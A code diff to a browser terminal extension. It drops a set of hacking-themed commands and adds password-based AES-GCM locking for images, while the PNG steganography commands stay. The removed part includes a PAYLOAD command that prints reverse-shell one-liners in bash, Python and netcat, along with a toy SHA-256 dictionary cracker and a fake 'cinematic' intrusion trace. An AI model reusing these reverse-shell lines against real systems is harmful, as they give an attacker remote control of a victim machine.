@@ -2,6 +2,7 @@
   'use strict';
   const T = Terminal;
 
+  // --- Helper for Image Loading (HIDE/SEEK) ---
   async function loadImageFromVFS(session, path) {
     const target = T.Utils.resolvePath(session.cwd, path);
     const entry = await T.Storage.get(target, 'vfs');
@@ -35,38 +36,60 @@
     return { img, dataUrl };
   }
 
-  async function sha256(text) {
-    const buf = new TextEncoder().encode(text);
-    const hash = await crypto.subtle.digest('SHA-256', buf);
-    return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
+  // --- Cryptographic Helpers for Image Lock/Unlock ---
+  async function deriveKey(password, salt) {
+    const enc = new TextEncoder();
+    const keyMaterial = await crypto.subtle.importKey(
+      'raw', enc.encode(password), { name: 'PBKDF2' }, false, ['deriveBits', 'deriveKey']
+    );
+    return crypto.subtle.deriveKey(
+      { name: 'PBKDF2', salt: salt, iterations: 100000, hash: 'SHA-256' },
+      keyMaterial, { name: 'AES-GCM', length: 256 }, false, ['encrypt', 'decrypt']
+    );
   }
 
-  async function cinematicTrace(session, target) {
-    const lines = [
-      '[*] Initializing connection to ' + target + '...',
-      '[*] Resolving DNS... Found IP: 192.168.1.104',
-      '[*] Bypassing firewall (Port 22, 80, 443)...',
-      '[*] Injecting payload...',
-      '[+] Access Granted. Root shell obtained.'
-    ];
-    for (const line of lines) {
-      await new Promise(r => setTimeout(r, 800));
-      if (line.startsWith('[+]')) session.printSuccess(line);
-      else session.printSystem(line);
+  async function encryptBlob(blob, password) {
+    const arrayBuffer = await blob.arrayBuffer();
+    const salt = crypto.getRandomValues(new Uint8Array(16));
+    const iv = crypto.getRandomValues(new Uint8Array(12));
+    const key = await deriveKey(password, salt);
+    const ciphertext = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, key, arrayBuffer);
+
+    const result = new Uint8Array(salt.length + iv.length + ciphertext.byteLength);
+    result.set(salt, 0);
+    result.set(iv, salt.length);
+    result.set(new Uint8Array(ciphertext), salt.length + iv.length);
+    return new Blob([result], { type: 'application/octet-stream' });
+  }
+
+  async function decryptBlob(blob, password) {
+    const arrayBuffer = await blob.arrayBuffer();
+    const bytes = new Uint8Array(arrayBuffer);
+    if (bytes.length < 28) throw new Error('Invalid encrypted file.');
+
+    const salt = bytes.slice(0, 16);
+    const iv = bytes.slice(16, 28);
+    const ciphertext = bytes.slice(28);
+
+    const key = await deriveKey(password, salt);
+    try {
+      const plaintext = await crypto.subtle.decrypt({ name: 'AES-GCM', iv }, key, ciphertext);
+      return new Blob([plaintext]);
+    } catch (e) {
+      throw new Error('Incorrect password or corrupted file.');
     }
   }
 
   T.registerExtension({
     name: 'kal',
-    info: 'Steganography + Cyber Security Suite loaded.',
+    info: 'Steganography and Image Security Suite loaded.',
     descriptions: {
-      HIDE:    'Hide text in PNG (HIDE <file.png> <text>)',
-      SEEK:    'Extract hidden text (SEEK <file.png>)',
-      HASH:    'SHA-256 hash (HASH <text>)',
-      CRACK:   'Dictionary attack (CRACK <hash>)',
-      CIPHER:  'Base64 + ROT13 (CIPHER <text>)',
-      TRACE:   'Cinematic trace (TRACE <ip>)',
-      PAYLOAD: 'Reverse shell payload (PAYLOAD <ip> <port>)'
+      HIDE: 'Hide text in PNG (HIDE <file.png> <text>)',
+      SEEK: 'Extract hidden text (SEEK <file.png>)',
+      IMGLOCK: 'Lock an image with a password (IMGLOCK <file.png> <password>)',
+      IMGOPEN: 'View a locked image (IMGOPEN <file.lock> <password>)',
+      IMGUNLOCK: 'Decrypt and save a locked image (IMGUNLOCK <file.lock> <password>)',
+      IMGCHANGE: 'Change password of a locked image (IMGCHANGE <file.lock> <old_pass> <new_pass>)'
     },
     commands: {
       HIDE: async function (arg) {
@@ -128,7 +151,6 @@
 
           this.printSuccess('Secret text hidden successfully!');
           this.printSystem('Saved as: ' + newName);
-          this.printSystem('(Note: Do not convert to JPG - LSB data will be destroyed.)');
 
         } catch (e) {
           this.printError(e.message);
@@ -185,58 +207,159 @@
         }
       },
 
-      HASH: async function (arg) {
-        if (!arg) return this.printError('Usage: HASH <text>');
-        const hash = await sha256(arg);
-        this.printSystem('Plaintext: ' + arg);
-        this.printSuccess('SHA-256:   ' + hash);
-      },
+      IMGLOCK: async function (arg) {
+        const match = arg.match(/^(\S+)\s+([\s\S]+)$/);
+        if (!match) return this.printError('Usage: IMGLOCK <file.png> <password>');
 
-      CRACK: async function (arg) {
-        if (!arg) return this.printError('Usage: CRACK <sha256_hash>');
-        this.printSystem('Target Hash: ' + arg);
-        this.printSystem('Initiating dictionary attack...');
-        const dictionary = ['admin', 'password', '123456', 'root', 'hacker', 'secret', 'gojo', 'kalma', 'qwerty', 'letmein'];
-        for (const word of dictionary) {
-          await new Promise(r => setTimeout(r, 100));
-          const hash = await sha256(word);
-          if (hash === arg.toLowerCase()) {
-            return this.printSuccess('CRACKED! The password is: ' + word);
-          }
+        const filename = match[1];
+        const password = match[2].trim();
+        const target = T.Utils.resolvePath(this.cwd, filename);
+        const entry = await T.Storage.get(target, 'vfs');
+
+        if (!entry || entry.type !== 'file' || !entry.isBinary) {
+          return this.printError('Image not found or invalid.');
         }
-        this.printError('FAILED. Password not found in dictionary.');
+
+        this.printSystem('Encrypting ' + filename + '...');
+
+        try {
+          const blob = entry.content instanceof Blob ? entry.content : new Blob([entry.content]);
+          const encryptedBlob = await encryptBlob(blob, password);
+          
+          const lockName = filename.replace(/\.[^.]+$/, '') + '.lock';
+          const lockTarget = T.Utils.resolvePath(this.cwd, lockName);
+          
+          await T.Storage.set(lockTarget, { type: 'file', content: encryptedBlob, isBinary: true }, 'vfs');
+          
+          this.printSuccess('Image locked successfully!');
+          this.printSystem('Saved as: ' + lockName);
+          this.printSystem('Use IMGOPEN or IMGUNLOCK with your password to access it.');
+        } catch (e) {
+          this.printError('Lock failed: ' + e.message);
+        }
       },
 
-      CIPHER: function (arg) {
-        if (!arg) return this.printError('Usage: CIPHER <text>');
-        let b64;
-        try { b64 = btoa(unescape(encodeURIComponent(arg))); }
-        catch (e) { b64 = '[encoding failed]'; }
-        const rot13 = arg.replace(/[a-zA-Z]/g, c => {
-          return String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
-        });
-        this.printSystem('Original: ' + arg);
-        this.printSystem('Base64:   ' + b64);
-        this.printSuccess('ROT13:    ' + rot13);
+      IMGOPEN: async function (arg) {
+        const match = arg.match(/^(\S+)\s+([\s\S]+)$/);
+        if (!match) return this.printError('Usage: IMGOPEN <file.lock> <password>');
+
+        const filename = match[1];
+        const password = match[2].trim();
+        const target = T.Utils.resolvePath(this.cwd, filename);
+        const entry = await T.Storage.get(target, 'vfs');
+
+        if (!entry || entry.type !== 'file') return this.printError('Locked file not found.');
+
+        this.printSystem('Decrypting ' + filename + '...');
+
+        try {
+          const decryptedBlob = await decryptBlob(entry.content, password);
+          const url = URL.createObjectURL(decryptedBlob);
+
+          // Create a floating window to show the image
+          const win = document.createElement('div');
+          win.style.cssText = 'position:fixed;z-index:9999;left:50px;top:80px;width:340px;height:400px;background:#fff;border:1px solid #374151;border-radius:8px;box-shadow:0 10px 30px rgba(0,0,0,.6);display:flex;flex-direction:column;overflow:hidden;';
+          
+          const header = document.createElement('div');
+          header.style.cssText = 'display:flex; justify-content:space-between; align-items:center; padding:4px 8px; cursor:move; user-select:none; flex-shrink:0; background:#374151; color:#f3f4f6; border-bottom:1px solid #1f2937; font-family:monospace; font-size:11px; font-weight:bold;';
+          
+          const title = document.createElement('span');
+          title.textContent = filename;
+          title.style.cssText = 'flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;';
+          
+          const btnClose = document.createElement('button');
+          btnClose.textContent = 'X';
+          btnClose.style.cssText = 'background:transparent;border:1px solid currentColor;color:#00d8ff;width:20px;height:20px;border-radius:3px;cursor:pointer;';
+          btnClose.onclick = () => { win.remove(); URL.revokeObjectURL(url); };
+          
+          header.appendChild(title); 
+          header.appendChild(btnClose);
+          win.appendChild(header);
+
+          const imgEl = document.createElement('img');
+          imgEl.src = url;
+          imgEl.style.cssText = 'flex:1;object-fit:contain;width:100%;background:#000;';
+          win.appendChild(imgEl);
+
+          let dragging = false, sx, sy, ox, oy;
+          const startDrag = (e) => {
+            const p = e.touches ? e.touches[0] : e;
+            dragging = true; sx = p.clientX; sy = p.clientY;
+            const r = win.getBoundingClientRect(); ox = r.left; oy = r.top;
+            e.preventDefault();
+          };
+          header.addEventListener('mousedown', startDrag);
+          header.addEventListener('touchstart', startDrag, { passive: false });
+          const onMove = (ev) => {
+            if (!dragging) return;
+            const pt = ev.touches ? ev.touches[0] : ev;
+            win.style.left = (ox + pt.clientX - sx) + 'px';
+            win.style.top = (oy + pt.clientY - sy) + 'px';
+          };
+          const endDrag = () => { dragging = false; };
+          document.addEventListener('mousemove', onMove);
+          document.addEventListener('mouseup', endDrag);
+          document.addEventListener('touchmove', onMove, { passive: false });
+          document.addEventListener('touchend', endDrag);
+
+          document.body.appendChild(win);
+          this.printSuccess('Image opened.');
+        } catch (e) {
+          this.printError(e.message);
+        }
       },
 
-      TRACE: async function (arg) {
-        const target = arg || '127.0.0.1';
-        this.printSystem('Starting trace route to ' + target + '...');
-        await cinematicTrace(this, target);
+      IMGUNLOCK: async function (arg) {
+        const match = arg.match(/^(\S+)\s+([\s\S]+)$/);
+        if (!match) return this.printError('Usage: IMGUNLOCK <file.lock> <password>');
+
+        const filename = match[1];
+        const password = match[2].trim();
+        const target = T.Utils.resolvePath(this.cwd, filename);
+        const entry = await T.Storage.get(target, 'vfs');
+
+        if (!entry || entry.type !== 'file') return this.printError('Locked file not found.');
+
+        this.printSystem('Decrypting ' + filename + '...');
+
+        try {
+          const decryptedBlob = await decryptBlob(entry.content, password);
+          
+          const outName = filename.replace(/\.lock$/i, '') + '_unlocked.png';
+          const outTarget = T.Utils.resolvePath(this.cwd, outName);
+          
+          await T.Storage.set(outTarget, { type: 'file', content: decryptedBlob, isBinary: true }, 'vfs');
+          this.printSuccess('Image decrypted successfully!');
+          this.printSystem('Saved as: ' + outName);
+        } catch (e) {
+          this.printError(e.message);
+        }
       },
 
-      PAYLOAD: function (arg) {
+      IMGCHANGE: async function (arg) {
         const parts = arg.trim().split(/\s+/);
-        const ip = parts[0] || '10.0.0.1';
-        const port = parts[1] || '4444';
-        this.printSystem('[ Generated Payloads for ' + ip + ':' + port + ' ]');
-        this.printSystem('[ Bash (Linux) ]');
-        this.printSystem('bash -i >& /dev/tcp/' + ip + '/' + port + ' 0>&1');
-        this.printSystem('[ Python ]');
-        this.printSystem('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' + ip + '",' + port + '));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'');
-        this.printSystem('[ Netcat ]');
-        this.printSystem('nc -e /bin/sh ' + ip + ' ' + port);
+        if (parts.length < 3) return this.printError('Usage: IMGCHANGE <file.lock> <old_pass> <new_pass>');
+
+        const filename = parts[0];
+        const oldPass = parts[1];
+        const newPass = parts[2];
+        
+        const target = T.Utils.resolvePath(this.cwd, filename);
+        const entry = await T.Storage.get(target, 'vfs');
+
+        if (!entry || entry.type !== 'file') return this.printError('Locked file not found.');
+
+        this.printSystem('Changing password for ' + filename + '...');
+
+        try {
+          const decryptedBlob = await decryptBlob(entry.content, oldPass);
+          const encryptedBlob = await encryptBlob(decryptedBlob, newPass);
+          
+          await T.Storage.set(target, { type: 'file', content: encryptedBlob, isBinary: true }, 'vfs');
+          this.printSuccess('Password changed successfully!');
+        } catch (e) {
+          this.printError(e.message);
+        }
       }
     }
   });
